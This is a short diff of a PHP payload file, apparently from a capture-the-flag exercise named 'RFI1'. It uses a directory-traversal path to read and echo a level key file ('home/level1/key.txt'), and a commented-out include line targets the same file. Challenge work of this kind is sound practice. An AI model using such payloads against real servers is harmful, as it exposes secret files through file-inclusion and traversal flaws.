@@ -1,10 +1,3 @@
-<html>
-
-	<head>
-	<title>RFI1</title>
-	</head>
-	<body>
-
 <?php
 	/*function foo(){
 		global $color;
@@ -13,14 +6,13 @@
 
 		echo "A $color $fruit";
 	}*/
-	$f = fopen("../../../../../../../../home/level1/key.txt", "r");
+	//$f = fopen("../../../../../../../../home/level1/key.txt", "r");
 	
+	$name = '../../../../../../../../home/level1/key.txt';
 	// Read line
-	echo fgets($f);
+	//echo fgets($f);
+	echo readfile($name);
 	
-	fclose($f);
+	//fclose($f);
 	//include($../../../../../home/level1/key.’.txt’);
 	?>
-	
-	</body>
-</html>
